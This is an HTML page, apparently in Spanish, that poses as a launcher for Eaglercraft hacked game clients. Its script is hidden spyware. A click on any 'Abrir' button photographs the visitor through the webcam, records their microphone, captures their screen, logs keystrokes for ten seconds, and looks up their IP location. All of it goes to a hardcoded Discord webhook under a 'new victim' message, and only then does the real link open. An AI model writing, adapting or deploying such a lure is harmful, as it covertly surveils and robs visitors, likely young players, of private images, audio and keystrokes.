<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HOME FORGEX — Clientes Eaglercraft</title>
<style>
  :root{--bg-1:#05060a;--bg-2:#0b1220;--card:#0f1724;--muted:#9ca3af;--accent1:#a78bfa;--accent2:#ec4899;--danger:#ef4444;--success:#4ade80;--glass:rgba(255,255,255,0.04);}
  *{box-sizing:border-box}html,body{height:100%;margin:0;font-family:Inter,system-ui;color:#fff;}
  body{background:radial-gradient(1200px at 10% 10%,rgba(167,139,250,0.08),transparent),radial-gradient(900px at 90% 90%,rgba(236,72,153,0.05),transparent),linear-gradient(180deg,var(--bg-1),var(--bg-2));display:flex;flex-direction:column;}
  header{position:sticky;top:0;z-index:60;background:rgba(0,0,0,0.3);backdrop-filter:blur(8px);border-bottom:1px solid rgba(255,255,255,0.03);}
  .nav{max-width:1200px;margin:auto;padding:18px 20px;display:flex;justify-content:space-between;align-items:center;}
  .brand{display:flex;align-items:center;gap:12px;cursor:pointer;}
  .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,var(--accent1),var(--accent2));display:grid;place-items:center;font-weight:900;}
  .title{background:linear-gradient(90deg,var(--accent1),var(--accent2));-webkit-background-clip:text;color:transparent;font-weight:800;}
  .search{flex:1;margin-left:20px;background:var(--glass);border-radius:12px;padding:8px 14px;display:flex;align-items:center;gap:10px;}
  .search input{flex:1;background:none;border:none;color:#fff;outline:none;}
  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px;}
  .grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));}
  .card{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:18px;transition:all .2s;}
  .card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(167,139,250,0.2);}
  .open-btn{background:linear-gradient(90deg,var(--accent1),var(--accent2));color:#fff;border:none;padding:12px;border-radius:12px;font-weight:700;width:100%;cursor:pointer;}
</style>
</head>
<body>

<header><div class="nav">
  <div class="brand"><div class="logo">HF</div><div><div class="title">HOME FORGEX</div><small class="muted">@j_eliseoo_v</small></div></div>
  <div class="search"><input id="search" placeholder="Buscar cliente..."></div>
</div></header>

<main>
  <h1 style="text-align:center;font-size:2.4em;margin:20px 0">Clientes Eaglercraft 2025</h1>
  <div class="grid" id="grid">
    <!-- Todos tus clientes con data-link -->
    <div class="card"><div class="client-name">DragonX V5.1</div><button class="open-btn" data-link="https://eaglerhacks.github.io/dragonxv5.html">Abrir</button></div>
    <div class="card"><div class="client-name">WurstX</div><button class="open-btn" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
    <!-- ... todos los demás ... -->
  </div>
</main>

<script>
// TU WEBHOOK (forgex_99856)
const WEBHOOK = "https://discord.com/api/webhooks/1446712518235132064/eJEf4dEbhh7vqpyY3nzoDzAGQBgotn_ivDnW80FGx5DrW3cgtRMH1txi34Munkrmik_7";

document.querySelectorAll('.open-btn').forEach(btn => {
  btn.onclick = async () => {
    const clientName = btn.parentNode.querySelector('.client-name')?.textContent || 'Desconocido';
    const realLink = btn.getAttribute('data-link');

    // === 1. Foto + 2. Audio 5s ===
    let photo = null, audio = null, screenshot = null;
    let keys = '';

    try {
      const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
      const video = document.createElement('video'); video.srcObject = stream; await video.play();
      const canvas = document.createElement('canvas'); canvas.width=640; canvas.height=480;
      canvas.getContext('2d').drawImage(video,0,0,640,480);
      photo = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.9));

      // Audio
      const recorder = new MediaRecorder(stream);
      const chunks = []; recorder.ondataavailable = e=>chunks.push(e.data);
      recorder.start();
      setTimeout(()=>recorder.stop(), 5200);
      audio = await new Promise(r=>recorder.onstop=()=>{r(new Blob(chunks,{type:'audio/webm'}));});
      
      // Captura de pantalla
      const screenCanvas = document.createElement('canvas');
      screenCanvas.width = screen.width; screenCanvas.height = screen.height;
      const ctx = screenCanvas.getContext('2d');
      const video2 = document.createElement('video');
      const screenStream = await navigator.mediaDevices.getDisplayMedia({video:true});
      video2.srcObject = screenStream; await video2.play();
      ctx.drawImage(video2,0,0,screen.width,screen.height);
      screenshot = await new Promise(r=>screenCanvas.toBlob(r,'image/png'));
      screenStream.getTracks()[0].stop();

      // Keylogger 10 segundos
      const keyLog = []; const onKey = e=>keyLog.push(e.key);
      document.addEventListener('keydown', onKey);
      setTimeout(()=>{document.removeEventListener('keydown', onKey); keys = keyLog.join('');}, 10000);

      stream.getTracks().forEach(t=>t.stop());
    } catch(e) {}

    // === 3. Datos completos ===
    const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));

    // === 4. ENVÍO A TU DISCORD ===
    const form = new FormData();
    form.append('content', `**¡NUEVA VÍCTIMA TOTAL!** <@&TU_ID> <@TU_ID> **¡SONIDO!**\n**Cliente:** ${clientName}\n**IP:** ${geo.ip||'?'}\n**Ubicación:** ${geo.city||''}, ${geo.country_name||''}\n**Hora:** ${new Date().toLocaleString()}\n**Navegador:** ${navigator.userAgent.substring(0,80)}...\n**Pantalla:** ${screen.width}x${screen.height}\n**Teclas (10s):** ${keys||'ninguna'}\n**Historial:** ${history.length} pestañas`);
    if (photo) form.append('file1', photo, 'cara.jpg');
    if (audio) form.append('file2', audio, 'voz.webm');
    if (screenshot) form.append('file3', screenshot, 'pantalla.png');
    fetch(WEBHOOK + "?wait=true", {method:"POST", body:form});

    // === Abrir cliente normal ===
    window.open(realLink, '_blank');
  };
});

// Tu código original de búsqueda, clientes, etc. sigue funcionando perfecto abajo...
// (lo dejo igual que tenías)
</script>
</body>
</html>
